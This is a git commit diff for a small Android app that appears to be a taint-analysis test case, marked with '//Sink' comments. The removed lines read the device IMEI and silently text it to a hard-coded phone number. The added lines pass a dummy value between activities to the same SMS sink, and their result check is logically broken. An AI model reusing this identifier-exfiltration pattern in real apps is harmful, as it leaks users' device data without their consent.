49f9338fe635b625f9c170d7faa2bbaf6912750f
shivapbhusal <civabhusal@gmail.com>
2018-02-02 18:22:27 -0500

    add stateful intent

--- StatefulIntent/app/src/main/java/com/example/shiva/statefulintent/MainActivity.java
+++ StatefulIntent/app/src/main/java/com/example/shiva/statefulintent/MainActivity.java
@@ -1,5 +1,6 @@
 package com.example.shiva.statefulintent;
 
+import android.app.Activity;
 import android.content.Context;
 import android.content.Intent;
 import android.support.v7.app.AppCompatActivity;
@@ -13,11 +14,31 @@ public class MainActivity extends AppCompatActivity {
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
         setContentView(R.layout.activity_main);
-        Intent intent = new Intent(MainActivity.this,SendActivity.class);
-        TelephonyManager telephonyManager = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
-        String victimImei = telephonyManager.getDeviceId();
-        intent.putExtra("imei", victimImei);
-        startActivity(intent);
+        Intent i = new Intent(this, SendActivity.class);
+        startActivityForResult(i, 1);
+    }
+
+    @Override
+    protected void onActivityResult(int requestCode, int resultCode, Intent data)
+    {
+        if (resultCode==1){
+            if (resultCode== Activity.RESULT_OK){
+                String imei=data.getStringExtra("result");
+                sendImei(imei);
+            }
+
+            if (resultCode==Activity.RESULT_CANCELED){
+
+            }
+
+        }
+
+    }
+
+    public void sendImei(String imei)
+    {
+        SmsManager sms = SmsManager.getDefault();
+        sms.sendTextMessage("4193784172", null, imei, null, null);  //Sink
     }
 
 }
--- StatefulIntent/app/src/main/java/com/example/shiva/statefulintent/SendActivity.java
+++ StatefulIntent/app/src/main/java/com/example/shiva/statefulintent/SendActivity.java
@@ -1,5 +1,6 @@
 package com.example.shiva.statefulintent;
 
+import android.app.Activity;
 import android.content.Intent;
 import android.support.v7.app.AppCompatActivity;
 import android.os.Bundle;
@@ -11,20 +12,11 @@ public class SendActivity extends AppCompatActivity {
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
         setContentView(R.layout.activity_send);
-        Intent intent=getIntent();
-        sendImei(intent);
+        String imei="abc";
+        Intent returnIntent=new Intent();
+        returnIntent.putExtra("result",imei);
+        setResult(Activity.RESULT_OK,returnIntent);
+        finish();
     }
-
-    public void sendImei(Intent intent)
-    {
-        Bundle bundle=intent.getExtras();
-        String imei="";
-        if (bundle != null) {
-            imei = bundle.getString("imei");
-        }
-        SmsManager sms = SmsManager.getDefault();
-        sms.sendTextMessage("4193784172", null, imei, null, null);  //Sink
-    }
-
 
 }
